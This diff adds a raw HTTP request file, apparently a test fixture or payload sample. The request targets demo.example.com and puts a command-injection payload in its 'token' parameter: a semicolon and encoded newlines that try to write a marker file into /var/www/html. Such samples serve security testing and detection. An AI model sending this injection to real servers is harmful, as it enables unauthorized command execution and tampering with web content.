@@ -1,0 +1,4 @@
+GET /a?token=;%0aecho%0aevil%0a>%0a/var/www/html/c.txt HTTP/1.1
+Host: demo.example.com
+Connection: close
+
